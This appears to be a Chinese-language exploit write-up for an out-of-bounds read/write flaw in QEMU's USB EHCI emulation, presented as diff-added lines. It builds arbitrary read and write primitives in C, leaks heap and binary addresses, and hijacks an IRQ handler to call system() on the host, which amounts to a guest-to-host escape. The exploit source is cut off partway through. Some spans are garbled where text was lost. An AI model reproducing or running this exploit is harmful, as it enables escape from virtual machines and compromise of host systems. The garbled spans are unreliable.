@@ -1,0 +1,244 @@
+    {
+        EHCIState *s = ptr;
+        int port = addr >> 2;
+        uint32_t *portsc = &s->portsc[port];
+        uint32_t old = *portsc;
+        USBDevice *dev = s->ports[port].dev;
+        trace_usb_ehci_portsc_write(addr + s->portscbase, addr >> 2, val);
+        /* Clear rwc bits */
+        *portsc &= ~(val & PORTSC_RWC_MASK);
+        /* The guest may clear, but not set the PED bit */
+        *portsc &= val | ~PORTSC_PED;
+        /* POWNER is masked out by RO_MASK as it is RO when we've no companion */
+        handle_port_owner_write(s, port, val);
+        /* And finally apply RO_MASK */
+        val &= PORTSC_RO_MASK;
+        if ((val & PORTSC_PRESET) && !(*portsc & PORTSC_PRESET)) {
+            trace_usb_ehci_port_reset(port, 1);  【1】attached) {
+                usb_port_reset(&s->ports[port]);
+                *portsc &= ~PORTSC_CSC;
+            }
+            /*
+             *  Table 2.16 Set the enable bit(and enable bit change) to indicate
+             *  to SW that this port has a high speed device attached
+             */
+            if (dev && dev->attached && (dev->speedmask & USB_SPEED_MASK_HIGH)) {
+                val |= PORTSC_PED; 【2】portscbase, addr >> 2, *portsc, old);
+    }
+设置PORTSC_PRESET会调用到【1】处trace_usb_ehci_port_reset(port,
+1);进行重置，设置PORTSC_PED后会调用到【2】处，enable port。
+前期漏洞触发环境已经设置好了，就可以进行越界读写了
+### 越界读
+（1）我们先调用do_token_setup 设置s->setup_len 的长度为越界长度，要进入do_token_setup
+需要通过设置qtd->token值：
+    #define QTD_TOKEN_PID_MASK            0x00000300
+    #define QTD_TOKEN_PID_SH              8
+    #define get_field(data, field) \
+        (((data) & field##_MASK) >> field##_SH)
+    #define USB_TOKEN_SETUP 0x2d
+    #define USB_TOKEN_IN    0x69 /* device -> host */
+    #define USB_TOKEN_OUT   0xe1 /* host -> device */
+    static int ehci_get_pid(EHCIqtd *qtd)
+    {
+        switch (get_field(qtd->token, QTD_TOKEN_PID)) {
+        case 0:
+            return USB_TOKEN_OUT;
+        case 1:
+            return USB_TOKEN_IN;
+        case 2:
+            return USB_TOKEN_SETUP;
+        default:
+            fprintf(stderr, "bad token\n");
+            return 0;
+        }
+    }
+所以get_field的实际操作为 ((qtd->token)&0x300)
+>>0x8，所以对于操作的判断实际上是取token第8个和第9个bit进行判断。所以设置成 2 setup_len   = (s->setup_buf[7] setup_buf[6];
+    if (s->setup_len > sizeof(s->data_buf)) {                 
+           fprintf(stderr,
+                 "usb_generic_handle_packet: ctrl buffer too small (%d > %zu)\n",
+                  s->setup_len, sizeof(s->data_buf));
+            p->status = USB_RET_STALL;
+            return;
+    }
+（2）设置qtd->token 为 1data_buf复制到qtd->bufptr[0]，进行泄露。其中
+p->iov.size大小由 qtd->token = size setup_buf[0] & USB_DIR_IN) {
+                int len = s->setup_len - s->setup_index;
+                if (len > p->iov.size) {
+                    len = p->iov.size;
+                }
+                usb_packet_copy(p, s->data_buf + s->setup_index, len);
+                s->setup_index += len;
+                if (s->setup_index >= s->setup_len) {
+                    s->setup_state = SETUP_STATE_ACK;
+                }
+                return;
+            }
+            s->setup_state = SETUP_STATE_IDLE;
+            p->status = USB_RET_STALL;
+            break;
+### 越界写
+同样需要先设置越界长度，再设置qtd->token 为
+0bufptr[0]复制到s->data_buf进行覆写。
+    case SETUP_STATE_DATA:
+            if (!(s->setup_buf[0] & USB_DIR_IN)) {
+                int len = s->setup_len - s->setup_index;
+                if (len > p->iov.size) {
+                    len = p->iov.size;
+                }
+                usb_packet_copy(p, s->data_buf + s->setup_index, len);
+                s->setup_index += len;
+                if (s->setup_index >= s->setup_len) {
+                    s->setup_state = SETUP_STATE_ACK;
+                }
+                return;
+            }
+            s->setup_state = SETUP_STATE_IDLE;
+            p->status = USB_RET_STALL;
+            break;
+这里需要注意的是经过几次调用后，s->setup_index >= s->setup_len 会满足条件，s->setup_state 会被设置成
+SETUP_STATE_ACK，可以通过调用一次do_token_setup，设置正常长度，将s->setup_state重新设置成SETUP_STATE_DATA。
+    do_token_setup：
+                …………
+    if (s->setup_buf[0] & USB_DIR_IN) {
+            usb_device_handle_control(s, p, request, value, index,
+                                      s->setup_len, s->data_buf);
+            if (p->status == USB_RET_ASYNC) {
+                s->setup_state = SETUP_STATE_SETUP;
+            }
+            if (p->status != USB_RET_SUCCESS) {
+                return;
+            }
+            if (p->actual_length setup_len) {
+                s->setup_len = p->actual_length;
+            }
+            s->setup_state = SETUP_STATE_DATA;
+        } else {
+            if (s->setup_len == 0)
+                s->setup_state = SETUP_STATE_ACK;
+            else
+                s->setup_state = SETUP_STATE_DATA; // setup_index += len 操作，此时s->setup_index
+就会被设置成0xfffffff8。
+    usb_packet_copy(p, s->data_buf + s->setup_index, len);
+     s->setup_index += len;
+（3）再次进行越界写，此时从data_buf-8处开始写，覆盖了setup字段，将setup[0] 设置成USB_DIR_IN，并且将setup_index
+覆盖成目标地址偏移-0x1018，因为也要经过s->setup_index += len;操作。并且本次进入case
+SETUP_STATE_DATA时：len = s->setup_len -s->setup_index操作（0x1010-(-0x8)=0x1018），使得len变成0x1018。
+    case SETUP_STATE_DATA:
+            if (s->setup_buf[0] & USB_DIR_IN) {
+                int len = s->setup_len - s->setup_index;
+                if (len > p->iov.size) {
+                    len = p->iov.size;
+                }
+                usb_packet_copy(p, s->data_buf + s->setup_index, len);
+（4）最后越界读，就能读取目标地址的内容
+    unsigned long arb_read(uint64_t target_addr)
+    {
+        setup_state_data();
+        set_length(0x1010, USB_DIR_OUT);
+        do_copy_write(0, 0x1010, 0xfffffff8-0x1010);
+        *(unsigned long *)(data_buf) = 0x2000000000000080; // set setup[0] -> USB_DIR_IN
+        unsigned int target_offset = target_addr - data_buf_addr;
+        do_copy_write(0x8, 0xffff, target_offset - 0x1018);// 这里offset为0x8，是因为从data_buf-8 处开始写。
+        do_copy_read(); // oob read
+        return *(unsigned long *)(data_buf);
+    }
+### 任意写原语
+（1）首先设置越界长度为0x1010
+（2）越界写，将setup_len 设置成目标偏移-0x1010，usb_packet_copy后面的s->setup_index += len
+操作后，s->setup_index就变成目标偏移offset。将setup_index设置成目标偏移+0x8， 经过下次越界写的len =
+s->setup_len - s->setup_index =》len=（offset+0x8）-offset=0x8，只修改目标地址8个字节的内容。
+（3）再次越界写，修改目标地址的内容。
+    void arb_write(uint64_t target_addr, uint64_t payload)
+    {
+        setup_state_data();
+        set_length(0x1010, USB_DIR_OUT);
+        unsigned long offset = target_addr - data_buf_addr;
+        do_copy_write(0, offset+0x8, offset-0x1010);
+        *(unsigned long *)(data_buf) = payload;
+        do_copy_write(0, 0xffff, 0);
+    }
+### 整体利用思路
+整体利用思路和  相同：
+（1）通过越界读获取 USBdevice
+对象的地址，这里通过读取dmabuf+0x2004可以得到USBDevice->remote_wakeup的内容（这里+4是因为结构体的内存对齐）。往下读有一个
+USBEndpoint ep_ctl 结构体，ep_ctl->dev 保存着USBdevice 对象的地址，就可以泄露 USBdevice
+对象的地址。计算偏移就可以获得data_buf 和USBPort 字段的地址。
+（2）查找越界读出来的内容，看是否有函数地址，就可以通过ida获取该函数的偏移，进而得到elf加载的基地址，以及system@plt的地址。
+（3）USBDevice 会在 realize 时，调用usb_claim_port，将USBDevice中的port字段设置为指向  
+EHCIState中的ports的地址， 读取USBDevice->port的内容就能获得EHCIState->ports 的地址，减去偏移得到
+EHCIState的地址。进而得到EHCIState->irq地址。
+（4）利用任意写将EHCIState->irq内容填充为伪造的irq地址，将handler
+填充成system@plt地址，opaque填充成payload的地址。
+    struct IRQState {
+        Object parent_obj;
+        qemu_irq_handler handler;
+        void *opaque;
+        int n;
+    };
+通过mmio 读写触发ehci_update_irq -> qemu_set_irq，最终执行system("xcalc")，完成利用。
+    void qemu_set_irq(qemu_irq irq, int level)
+    {
+        if (!irq)
+            return;
+        irq->handler(irq->opaque, irq->n, level);
+    }
+（5）最后将保存的EHCIState->irq原内容填充回去，由于会多次调用qemu_set_irq，所以会执行多次payload。
+exp代码：
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include   
+    #include   
+    #include   
+    #include   
+    #include   
+    #include   
+    #include 
+    #include   
+    struct EHCIqh * qh;
+    struct EHCIqtd * qtd;
+    struct ohci_td * td;
+    char *dmabuf;
+    char *setup_buf;
+    unsigned char *mmio_mem;
+    unsigned char *data_buf;
+    unsigned char *data_buf_oob;
+    uint32_t *entry;
+    uint64_t dev_addr;
+    uint64_t data_buf_addr;
+    uint64_t USBPort_addr; 
+    #define PORTSC_PRESET       (1  host */
+    #define USB_TOKEN_OUT       0 /* host -> device */
+    #define QTD_TOKEN_TBYTES_SH 16
+    #define QTD_TOKEN_PID_SH    8
+    typedef struct USBDevice USBDevice;
+    typedef struct USBEndpoint USBEndpoint;
+    struct USBEndpoint {
+        uint8_t nr;
+        uint8_t pid;
+        uint8_t type;
+        uint8_t ifnum;
+        int max_packet_size;
+        int max_streams;
+        bool pipeline;
+        bool halted;
+        USBDevice *dev;
+        USBEndpoint *fd;
+        USBEndpoint *bk;
+    };
+    struct USBDevice {
+        int32_t remote_wakeup;
+        int32_t setup_state;
+        int32_t setup_len;
+        int32_t setup_index;
+        USBEndpoint ep_ctl;
+        USBEndpoint ep_in[15];
+        USBEndpoint ep_out[15];
